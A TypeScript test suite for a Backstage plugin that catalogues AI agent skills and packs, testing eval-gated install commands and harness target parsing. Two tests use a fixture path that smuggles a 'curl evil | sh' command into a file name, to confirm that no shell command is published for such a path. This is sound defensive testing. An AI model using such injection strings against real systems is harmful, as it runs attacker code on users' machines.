import { Entity } from '@backstage/catalog-model';
import {
  ANNOTATION_COMMIT,
  ANNOTATION_EVAL_SCORE,
  ANNOTATION_EVAL_SCORE_REF,
  ANNOTATION_SOURCE_LOCATION,
  readEvalScore,
  readInstallUnavailable,
  readHarnesses,
  readInstallCommands,
  isInstallable,
} from '@internal/plugin-skill-hub-common';
import { RepoRef, TreeEntry } from '../github/GithubAssetReader';
import { buildEntities, publishedPaths } from './entities';
import { parseManifest } from './manifest';

const SHA = 'a'.repeat(40);
const REPO: RepoRef = {
  owner: 'wololo-labs',
  repo: 'estate',
  defaultBranch: 'main',
  archived: false,
};

function repository(files: Record<string, string>) {
  const tree: TreeEntry[] = Object.keys(files).map(path => ({
    path,
    sha: `blob-${path}`,
    type: 'blob',
  }));
  return {
    tree,
    read: async (path: string) => {
      const content = files[path];
      if (content === undefined) throw new Error(`no blob at ${path}`);
      return content;
    },
  };
}

const find = (entities: Entity[], kind: string, name: string) =>
  entities.find(e => e.kind === kind && e.metadata.name === name);

describe('buildEntities', () => {
  it('turns each publish key into its own spec type, pinned to the commit', async () => {
    const files = {
      'skills/commit/SKILL.md':
        '---\nname: commit\ndescription: Make well formed commits\n---\n\n# Commit\n',
      'agents/engineering/reviewer.agent.md':
        '---\nname: reviewer\ndescription: Reviews a diff\n---\n',
      'utilities/hooks/stop.py':
        '#!/usr/bin/env python3\n"""Runs when the session stops."""\n',
      'prompts/triage.md': '---\ndescription: Triage an incident\n---\n',
      'evals/qe.eval.md': '---\ndescription: The QE benchmark\n---\n',
      'rules/style.md': '---\ndescription: House style\n---\n',
    };
    const manifest = parseManifest(`
owner: team-ai-platform
publish:
  skills:  skills/*/SKILL.md
  agents:  agents/**/*.agent.md
  hooks:   utilities/hooks/*.py
  prompts: prompts/*.md
  evals:   evals/*.eval.md
  rules:   rules/*.md
`);

    const { entities, counts } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository(files),
    });

    expect(entities.map(e => e.spec?.type).sort()).toEqual([
      'agent',
      'eval-suite',
      'hook',
      'prompt',
      'rule',
      'skill',
    ]);
    expect(counts).toEqual({
      skills: 1,
      agents: 1,
      hooks: 1,
      prompts: 1,
      evals: 1,
      rules: 1,
    });

    const skill = find(entities, 'AiResource', 'commit')!;
    expect(skill.metadata.namespace).toBe('wololo-labs-estate');
    expect(skill.metadata.description).toBe('Make well formed commits');
    expect(skill.spec?.owner).toBe('group:default/team-ai-platform');
    // A skill is a directory of files, so it is addressed as a tree.
    expect(skill.metadata.annotations?.[ANNOTATION_SOURCE_LOCATION]).toBe(
      `url:https://github.com/wololo-labs/estate/tree/${SHA}/skills/commit/`,
    );
    expect(skill.metadata.annotations?.[ANNOTATION_COMMIT]).toBe(SHA);

    // Python has no frontmatter, so the module docstring is the description.
    expect(find(entities, 'AiResource', 'stop')!.metadata.description).toBe(
      'Runs when the session stops.',
    );
  });

  it('has no score, and therefore no install, for a standalone asset', async () => {
    const manifest = parseManifest(
      'owner: team\npublish:\n  skills: skills/*/SKILL.md\n',
    );
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository({
        'skills/lonely/SKILL.md': '---\ndescription: On its own\n---\n',
      }),
    });

    const skill = entities[0];
    expect(isInstallable(skill)).toBe(false);
    // A command still exists: the gate is the score, not the absence of a
    // command, and the panel needs something to show once it is scored.
    expect(readInstallCommands(skill).claude).toContain(
      `ainb skill install 'gh:wololo-labs/estate@${SHA}/skills/lonely'`,
    );
  });

  it('gives a pack its score and gives its members the same score and command', async () => {
    const manifest = parseManifest(`
owner: team-ai-platform
publish:
  packages: packages/*/apm.yml
  skills:   packages/*/.apm/skills/*/SKILL.md
`);
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository({
        'packages/qe-agent-pack/apm.yml': [
          'name: qe-agent-pack',
          'version: 0.1.0',
          'description: Quality engineering agent pack',
          'keywords: [testing, qe]',
          'dependencies:',
          '  mcp:',
          '    - name: playwright-test',
          '      transport: stdio',
          '      command: npx',
          '      args: ["playwright", "run-test-mcp-server"]',
        ].join('\n'),
        'packages/qe-agent-pack/eval-score.json': JSON.stringify({
          verdict: 'PASS',
          recorded: '2026-09-04',
          metrics: { mutation_kill_rate: { candidate: 0.3, baseline: 0.23 } },
        }),
        'packages/qe-agent-pack/.apm/skills/webapp-testing/SKILL.md':
          '---\ndescription: Drive a local web app\n---\n',
      }),
    });

    const pack = find(entities, 'System', 'qe-agent-pack')!;
    expect(pack.metadata.title).toBe('qe-agent-pack 0.1.0');
    expect(pack.metadata.tags).toEqual(['testing', 'qe']);
    expect(readEvalScore(pack)?.verdict).toBe('PASS');
    expect(isInstallable(pack)).toBe(true);
    expect(readInstallCommands(pack).copilot).toBe(
      `apm install 'wololo-labs/estate/packages/qe-agent-pack#${SHA}' --target copilot`,
    );

    // A member is installed as the pack, and carries the pack's score so the
    // gate is a local check rather than a second lookup.
    const skill = find(entities, 'AiResource', 'webapp-testing')!;
    expect(skill.spec?.system).toBe('qe-agent-pack');
    expect(skill.metadata.annotations?.[ANNOTATION_EVAL_SCORE_REF]).toBe(
      'system:wololo-labs-estate/qe-agent-pack',
    );
    expect(readEvalScore(skill)?.verdict).toBe('PASS');
    expect(readInstallCommands(skill).claude).toBe(
      `apm install 'wololo-labs/estate/packages/qe-agent-pack#${SHA}' --target claude`,
    );

    // The MCP server the pack declares is an API entity, not an AiResource.
    const mcp = find(entities, 'API', 'playwright-test')!;
    expect(mcp.spec?.type).toBe('mcp-server');
    expect(mcp.spec?.system).toBe('qe-agent-pack');
  });

  it('takes the score from the gate report, ahead of anything transcribed by hand', async () => {
    const measuredAt = 'c'.repeat(40);
    const gateReport = JSON.stringify({
      schema_version: '1.0.0',
      verdict: 'pass',
      reason: '',
      recorded: '2026-09-04',
      source: 'https://github.com/wololo-labs/wololo-evals/actions/runs/1',
      sourceVisibility: 'internal',
      subject: {
        repo: 'wololo-labs/estate',
        path: 'packages/qe-agent-pack',
        commit: measuredAt,
      },
      signals: [
        {
          evaluator_id: 'qe_review',
          candidate_mean: 0.8,
          baseline_mean: 0.8,
          guarded: false,
        },
        {
          evaluator_id: 'mutation_kill_rate',
          candidate_mean: 0.3012,
          baseline_mean: 0.2373,
          guarded: true,
        },
      ],
    });

    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
        'packages/qe-agent-pack/eval-gate-report.json': gateReport,
        'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
      }),
    });

    const score = readEvalScore(entities[0])!;
    expect(score.verdict).toBe('PASS');
    expect(isInstallable(entities[0])).toBe(true);
    expect(score.recorded).toBe('2026-09-04');
    expect(score.measuredCommit).toBe(measuredAt);
    // The guarded signal is the headline, because it is the one the gate
    // would have failed on.
    expect(Object.keys(score.metrics!)).toEqual([
      'mutation_kill_rate',
      'qe_review',
    ]);
    expect(score.metrics!.mutation_kill_rate).toEqual({
      candidate: 0.3012,
      baseline: 0.2373,
    });
  });

  it('keeps the install blocked when the gate did not pass', async () => {
    const report = (verdict: string) =>
      JSON.stringify({ verdict, signals: [], subject: { commit: 'd'.repeat(40) } });

    for (const verdict of ['regression', 'refused']) {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
          'packages/qe-agent-pack/eval-gate-report.json': report(verdict),
          // A hand-written PASS beside a failed gate changes nothing.
          'packages/qe-agent-pack/eval-score.json': '{"verdict":"PASS"}',
        }),
      });

      expect(readEvalScore(entities[0])?.verdict).toBe(verdict.toUpperCase());
      expect(isInstallable(entities[0])).toBe(false);
    }
  });

  describe('which harnesses a pack is offered for', () => {
    const pack = async (apmYaml: string, harnesses = '') => {
      const { entities, warnings } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          `owner: team\n${harnesses}publish:\n  packages: packages/*/apm.yml\n  skills: packages/*/.apm/skills/*/SKILL.md\n`,
        ),
        ...repository({
          'packages/p/apm.yml': apmYaml,
          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: a skill\n---\n',
        }),
      });
      return {
        entities,
        system: find(entities, 'System', 'p')!,
        skill: find(entities, 'AiResource', 's')!,
        warnings,
      };
    };

    it('offers only the targets the pack declares, because APM skips the rest', async () => {
      // `apm install --target codex` on this pack exits 0 and deploys none of
      // it, so a codex command here would succeed and deliver nothing.
      const { system, skill } = await pack(
        'name: p\nversion: 0.1.0\ntargets:\n  - copilot\n  - claude\n',
      );

      expect(readHarnesses(system)).toEqual(['claude', 'copilot']);
      expect(Object.keys(readInstallCommands(system)).sort()).toEqual([
        'claude',
        'copilot',
      ]);
      // A member installs as the pack, so it is offered what the pack is.
      expect(readHarnesses(skill)).toEqual(['claude', 'copilot']);
      expect(readInstallCommands(skill).codex).toBeUndefined();
    });

    it('never offers a target the repository manifest has narrowed away', async () => {
      // An owner who writes harnesses: [claude] has said claude is all they
      // support, so a pack declaring more does not widen it.
      const narrowed = 'harnesses: [claude]\n';
      const both = await pack('name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n', narrowed);
      expect(readHarnesses(both.system)).toEqual(['claude']);
      expect(readHarnesses(both.skill)).toEqual(['claude']);

      const outside = await pack('name: p\nversion: 0.1.0\ntargets: [cursor]\n', narrowed);
      expect(readHarnesses(outside.system)).toEqual([]);
      // A pack nobody can install is a catalogue-level problem, not a silent
      // empty list: the owner is told which pack and why.
      expect(outside.warnings).toEqual([
        expect.stringMatching(/packages\/p.*cursor.*no install command/),
      ]);
    });

    describe('an MCP server the pack depends on', () => {
      // docs/INSTALL-PROOF.md: on a pack declaring [claude, copilot], APM
      // skips the pack's primitives for --target codex but still reports
      // "1 MCP server" and writes it to .codex/config.toml. So the Codex
      // command does deliver something for the server, and only for it.
      const withMcp = (harnesses = '') =>
        pack(
          'name: p\nversion: 0.1.0\ntargets: [claude, copilot]\ndependencies:\n  mcp:\n    - name: runner\n      transport: stdio\n',
          harnesses,
        );
      const server = (entities: Entity[]) => find(entities, 'API', 'runner')!;

      it('keeps the codex command, which APM still deploys the server for', async () => {
        const { entities } = await withMcp();
        expect(readHarnesses(server(entities))).toEqual(['claude', 'copilot', 'codex']);
        expect(readInstallCommands(server(entities)).codex).toContain('--target codex');
      });

      it('still leaves codex off the pack and its skills', async () => {
        const { system, skill } = await withMcp();
        expect(readHarnesses(system)).toEqual(['claude', 'copilot']);
        expect(readHarnesses(skill)).toEqual(['claude', 'copilot']);
      });

      it('keeps codex when the pack was narrowed to nothing but APM still reads it', async () => {
        const { entities } = await pack(
          'name: p\nversion: 0.1.0\ntargets: [cursor]\ndependencies:\n  mcp:\n    - name: runner\n',
          'harnesses: [claude, codex]\n',
        );
        expect(readHarnesses(server(entities))).toEqual(['codex']);
      });

      it('offers nothing for a pack APM refuses to read', async () => {
        const { entities } = await pack(
          'name: p\nversion: 0.1.0\ntargets: []\ndependencies:\n  mcp:\n    - name: runner\n',
        );
        expect(readHarnesses(server(entities))).toEqual([]);
      });

      it('does not add codex when the repository has narrowed it away', async () => {
        const { entities } = await withMcp('harnesses: [claude, copilot]\n');
        expect(readHarnesses(server(entities))).toEqual(['claude', 'copilot']);
      });
    });

    it('lets an owner who lists cursor opt a cursor pack in', async () => {
      const { system } = await pack(
        'name: p\nversion: 0.1.0\ntargets: [claude, cursor]\n',
        'harnesses: [claude, cursor]\n',
      );
      expect(readHarnesses(system)).toEqual(['claude', 'cursor']);
    });

    it('offers a standalone asset only what ainb can install it to', async () => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\nharnesses: [claude, cursor]\npublish:\n  skills: skills/*/SKILL.md\n',
        ),
        ...repository({ 'skills/s/SKILL.md': '---\ndescription: d\n---\n' }),
      });
      expect(readHarnesses(find(entities, 'AiResource', 's')!)).toEqual(['claude']);
    });

    it('says the path is why when a standalone asset cannot be pasted into a shell', async () => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  skills: skills/*/SKILL.md\n',
        ),
        ...repository({
          "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: x\n---\n',
        }),
      });
      expect(readInstallUnavailable(entities[0])).toBe('path');
    });

    it('does not give codex to a loose MCP file inside the pack', async () => {
      // The codex evidence covers servers the pack declares under
      // dependencies.mcp. A file the repository merely publishes from inside
      // the pack is not one, so codex would install and deliver nothing.
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n  mcp: packages/*/mcp/*.json\n',
        ),
        ...repository({
          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n',
          'packages/p/mcp/loose.json': '{"name":"loose"}',
        }),
      });
      expect(readHarnesses(find(entities, 'API', 'loose')!)).toEqual([
        'claude',
        'copilot',
      ]);
    });

    it('falls back to the repository manifest when the pack declares nothing', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\n');
      expect(readHarnesses(system)).toEqual(['claude', 'copilot', 'codex']);
    });

    it('reads the singular target key and APM slugs beyond the original three', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\ntarget: cursor\n');
      expect(readHarnesses(system)).toEqual(['cursor']);
      expect(readInstallCommands(system).cursor).toContain('--target cursor');
    });

    it('treats all as no restriction, which is what APM does with it', async () => {
      // APM folds `all` in apm.yml to the same behaviour as omitting the
      // field (apm_cli/core/apm_yml.py, 0.29.0 and 0.33.0), so --target
      // decides and nothing is excluded. Expanding it to a list would hide
      // targets the pack does deploy to.
      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: all\n');
      expect(readHarnesses(system)).toEqual(['claude', 'copilot', 'codex']);
    });

    it('reads vscode as copilot, because APM accepts it in apm.yml as that', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: [vscode]\n');
      expect(readHarnesses(system)).toEqual(['copilot']);
    });

    it('reads a comma separated list under the singular key, as APM does', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\ntarget: "claude, copilot"\n');
      expect(readHarnesses(system)).toEqual(['claude', 'copilot']);
    });

    describe('the singular target field, which APM reads with parse_target_field', () => {
      it.each([
        ['Claude', ['claude']],
        ['agents', ['copilot']],
        ['agy', ['antigravity']],
        ['vscode', ['copilot']],
        ['"Claude, COPILOT"', ['claude', 'copilot']],
        ['[Claude, vscode]', ['claude', 'copilot']],
      ])('lowercases and resolves aliases in %s', async (value, expected) => {
        const { system } = await pack(`name: p\nversion: 0.1.0\ntarget: ${value}\n`);
        expect(readHarnesses(system)).toEqual(expected);
      });

      it.each([
        ['an empty string', 'target: ""'],
        ['only commas', 'target: " , "'],
        ['an empty list', 'target: []'],
        ['a non-string entry', 'target: [claude, 1]'],
        ['all mixed with a target', 'target: "all,claude"'],
      ])('refuses %s', async (_, yaml) => {
        const { system, warnings } = await pack(`name: p\nversion: 0.1.0\n${yaml}\n`);
        expect(readHarnesses(system)).toEqual([]);
        expect(readInstallUnavailable(system)).toBe('refused');
        expect(warnings).toEqual([expect.stringContaining('packages/p')]);
      });

      it('reads all as every target APM auto-detects, not as no restriction', async () => {
        // Unlike `targets: all`, which APM folds to nothing declared, the
        // singular field returns the real all and it does not include the
        // explicit-only targets.
        const { system } = await pack('name: p\nversion: 0.1.0\ntarget: all\n');
        const offered = readHarnesses(system);
        expect(offered).toContain('gemini');
        expect(offered).toContain('codex');
        for (const explicitOnly of ['antigravity', 'hermes', 'agent-skills']) {
          expect(offered).not.toContain(explicitOnly);
        }
      });

      it('lets all be combined with explicit-only targets', async () => {
        const { system } = await pack('name: p\nversion: 0.1.0\ntarget: "all, agent-skills"\n');
        expect(readHarnesses(system)).toContain('agent-skills');
        expect(readHarnesses(system)).toContain('claude');
      });
    });

    it('reads a lone value under targets as one target', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: claude\n');
      expect(readHarnesses(system)).toEqual(['claude']);
    });

    it('does not accept spellings APM rejects in apm.yml', async () => {
      // APM compares targets case sensitively and only accepts `vscode`, not
      // `agents` or `agy`, in a manifest. A pack that wrote them fails to
      // install, so no command is offered for them.
      for (const bad of ['Claude', 'agents', 'agy']) {
        const { system } = await pack(`name: p\nversion: 0.1.0\ntargets: [${bad}]\n`);
        expect(readHarnesses(system)).toEqual([]);
      }
    });

    it.each([
      ['a scalar', 'just some text'],
      ['a list', '- a\n- b'],
    ])('treats an apm.yml that is %s as a refused pack, not a crash', async (_, yaml) => {
      // The reviewer's case: `'targets' in "text"` throws, which sent the
      // whole repository to error and kept serving its stale entities.
      const { system, warnings } = await pack(`${yaml}\n`);
      expect(readHarnesses(system)).toEqual([]);
      expect(readInstallCommands(system)).toEqual({});
      expect(warnings).toEqual([expect.stringMatching(/packages\/p.*mapping/)]);
    });

    it('treats an apm.yml that does not parse as a refused pack, members included', async () => {
      // Skipping it silently left its members looking like standalone assets,
      // installable to every harness, from a pack APM cannot read.
      const { system, skill, warnings } = await pack('name: [unclosed\n');
      expect(readInstallCommands(system)).toEqual({});
      expect(readHarnesses(skill)).toEqual([]);
      expect(readInstallCommands(skill)).toEqual({});
      expect(warnings).toEqual([expect.stringMatching(/packages\/p.*parsed/)]);
    });

    it.each([
      ['no version', 'name: p\n'],
      ['no name', 'version: 0.1.0\n'],
      ['an empty name', 'name: ""\nversion: 0.1.0\n'],
      ['a blank version', 'name: p\nversion: "  "\n'],
      ['a version that is not a string', 'name: p\nversion: 1\n'],
    ])('treats an apm.yml with %s as refused, because APM requires both', async (_, yaml) => {
      // apm_cli/models/apm_package.py: name and version must be non-empty
      // strings or APM refuses the pack.
      const { system, skill, warnings } = await pack(yaml);
      for (const entity of [system, skill]) {
        expect(readHarnesses(entity)).toEqual([]);
        expect(readInstallUnavailable(entity)).toBe('refused');
      }
      expect(warnings).toEqual([expect.stringMatching(/packages\/p.*(name|version)/)]);
    });

    it.each([
      ['an empty list', 'targets: []'],
      ['no value', 'targets:'],
      ['both keys at once', 'targets: [claude]\ntarget: claude'],
      ['a mapping', 'targets:\n  claude: true'],
    ])('treats %s as a declaration error, offers nothing and says so', async (_, yaml) => {
      // APM refuses to read a manifest like this at all, so the pack cannot be
      // installed whatever the hub offers. Falling back to the repository's
      // harnesses would hand over a command that fails.
      const { system, warnings } = await pack(`name: p\nversion: 0.1.0\n${yaml}\n`);
      expect(readHarnesses(system)).toEqual([]);
      expect(readInstallCommands(system)).toEqual({});
      expect(warnings).toEqual([expect.stringContaining('packages/p')]);
    });

    it('still treats an empty singular target as no declaration, as APM does', async () => {
      const { system, warnings } = await pack('name: p\nversion: 0.1.0\ntarget:\n');
      expect(readHarnesses(system)).toEqual(['claude', 'copilot', 'codex']);
      expect(warnings).toEqual([]);
    });

    it('refuses the whole pack for one unknown target, as APM does, and offers nothing', async () => {
      // APM 0.33.0 raises on any token it does not accept and refuses the
      // whole apm.yml, so claude here installs nothing either.
      const { system, skill, warnings } = await pack(
        'name: p\nversion: 0.1.0\ntargets: [claude, brand-new]\n',
      );
      for (const entity of [system, skill]) {
        expect(readHarnesses(entity)).toEqual([]);
        expect(readInstallCommands(entity)).toEqual({});
        expect(readInstallUnavailable(entity)).toBe('unknown-target');
      }
      expect(warnings).toEqual([expect.stringContaining('brand-new')]);
    });

    it('gives no codex command for an MCP server of a pack APM refuses over an unknown target', async () => {
      const { entities } = await pack(
        'name: p\nversion: 0.1.0\ntargets: [claude, brand-new]\ndependencies:\n  mcp:\n    - name: runner\n',
      );
      expect(readHarnesses(find(entities, 'API', 'runner')!)).toEqual([]);
    });

    describe('why a pack offers no command', () => {
      const why = async (yaml: string, harnesses = '') => {
        const { system, skill } = await pack(yaml, harnesses);
        expect(readInstallUnavailable(skill)).toBe(readInstallUnavailable(system));
        return readInstallUnavailable(system);
      };

      it('says the pack declaration is the problem when APM would refuse it', async () => {
        expect(await why('name: p\nversion: 0.1.0\ntargets: []\n')).toBe('refused');
        expect(await why('name: [unclosed\n')).toBe('refused');
      });

      it('says the repository narrowed it away when only its harnesses list is why', async () => {
        expect(await why('name: p\nversion: 0.1.0\ntargets: [cursor]\n', 'harnesses: [claude]\n')).toBe(
          'narrowed',
        );
      });

      it('says the hub does not know the target when that is why', async () => {
        expect(await why('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n')).toBe(
          'unknown-target',
        );
      });

      it('says nothing when there is a command', async () => {
        expect(await why('name: p\nversion: 0.1.0\ntargets: [claude]\n')).toBeUndefined();
      });
    });

    it('reports an unknown target once, as the reason the pack is refused', async () => {
      const { warnings } = await pack('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n');
      expect(warnings).toEqual([
        expect.stringMatching(/not-a-harness.*APM 0\.33\.0.*no install command/),
      ]);
    });

    it('offers nothing for a declaration naming only unknown targets', async () => {
      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n');
      expect(readHarnesses(system)).toEqual([]);
      expect(readInstallCommands(system)).toEqual({});
    });
  });

  it('prefers the publisher catalogue for the score, and keeps the commit it was measured at', async () => {
    const measuredAt = 'b'.repeat(40);
    const catalogInfo = [
      'apiVersion: backstage.io/v1alpha1',
      'kind: System',
      'metadata:',
      '  name: qe-agent-pack',
      '  annotations:',
      `    ${ANNOTATION_SOURCE_LOCATION}: url:https://github.com/wololo-labs/estate/tree/${measuredAt}/packages/qe-agent-pack/`,
      `    ${ANNOTATION_EVAL_SCORE}: '{"verdict":"PASS","recorded":"2026-09-04"}'`,
      'spec:',
      '  owner: user:stevengonsalvez',
    ].join('\n');

    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
        'packages/qe-agent-pack/catalog-info.yaml': catalogInfo,
        'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
      }),
    });

    const score = readEvalScore(entities[0])!;
    expect(score.verdict).toBe('PASS');
    // The score was measured somewhere other than the pinned commit, and the
    // detail page has to be able to say so.
    expect(score.measuredCommit).toBe(measuredAt);
  });

  it('publishes no install command for a path that could break its own quoting', async () => {
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        "owner: team\npublish:\n  skills: 'skills/*/SKILL.md'\n",
      ),
      ...repository({
        "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: hostile\n---\n',
        'skills/honest/SKILL.md': '---\ndescription: fine\n---\n',
      }),
    });

    const hostile = entities.find(e => e.metadata.description === 'hostile')!;
    // Browsable and readable, but nothing to paste into a shell.
    expect(hostile).toBeDefined();
    expect(readInstallCommands(hostile)).toEqual({});
    expect(
      readInstallCommands(
        entities.find(e => e.metadata.description === 'fine')!,
      ).claude,
    ).toContain('ainb skill install');
  });

  it('reports a repository with zero assets rather than losing it', async () => {
    const { entities, counts } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  skills: nothing/here/*/SKILL.md\n',
      ),
      ...repository({ 'README.md': '# nothing to publish\n' }),
    });

    expect(entities).toEqual([]);
    expect(counts).toEqual({});
  });

  it('blocks install for an asset whose eval gate failed', async () => {
    // A failed gate is a measurement that the asset does not work. Treating it
    // as "scored, therefore installable" would make a known-bad asset easier to
    // install than an unmeasured one.
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest('owner: team\npublish:\n  packages: packages/*/apm.yml\n'),
      ...repository({
        'packages/broken-pack/apm.yml': 'name: broken-pack\nversion: 0.1.0\n',
        'packages/broken-pack/eval-score.json': JSON.stringify({
          verdict: 'FAIL',
          recorded: '2026-09-04',
        }),
      }),
    });

    const pack = find(entities, 'System', 'broken-pack')!;
    expect(readEvalScore(pack)?.verdict).toBe('FAIL');
    expect(isInstallable(pack)).toBe(false);
  });

  it('keeps the first of two globs that claim the same name, and says so', async () => {
    const { entities, collisions } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  skills:\n    - a/*/SKILL.md\n    - b/*/SKILL.md\n',
      ),
      ...repository({
        'a/tdd/SKILL.md': '---\ndescription: from a\n---\n',
        'b/tdd/SKILL.md': '---\ndescription: from b\n---\n',
      }),
    });

    expect(entities).toHaveLength(1);
    expect(entities[0].metadata.description).toBe('from a');
    expect(collisions).toEqual(['AiResource:wololo-labs-estate/tdd']);
  });

  it('lets a failed read of apm.yml propagate, so the provider can carry the repository forward', async () => {
    // A fetch error is not a parse error: refusing the pack for it would
    // publish a refused pack in place of a good one on a transient failure.
    const build = buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      tree: [{ path: 'packages/p/apm.yml', sha: 'x', type: 'blob' }],
      read: async () => {
        throw new Error('GitHub 502');
      },
    });
    await expect(build).rejects.toThrow('GitHub 502');
  });

  it('survives an unreadable asset without dropping the rest', async () => {
    const { entities, warnings } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/broken/apm.yml': 'name: [unclosed',
        'packages/fine/apm.yml': 'name: fine\nversion: 0.1.0\n',
      }),
    });

    // The unparseable pack is kept as a refused one, with nothing to install,
    // and the pack beside it is untouched.
    expect(entities.map(e => e.metadata.name)).toEqual(['broken', 'fine']);
    expect(readInstallCommands(find(entities, 'System', 'broken')!)).toEqual({});
    expect(Object.keys(readInstallCommands(find(entities, 'System', 'fine')!))).toContain('claude');
    expect(warnings).toEqual([expect.stringContaining('packages/broken')]);
  });
});

describe('publishedPaths', () => {
  it('includes the sidecars a package needs, and nothing else', () => {
    const manifest = parseManifest(
      'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
    );
    const files = [
      'packages/qe/apm.yml',
      'packages/qe/catalog-info.yaml',
      'packages/qe/eval-score.json',
      'packages/qe/README.md',
      'packages/qe/PROOF.md',
      'unrelated.md',
    ];

    expect(publishedPaths(manifest, files).sort()).toEqual([
      'packages/qe/README.md',
      'packages/qe/apm.yml',
      'packages/qe/catalog-info.yaml',
      'packages/qe/eval-score.json',
    ]);
  });
});
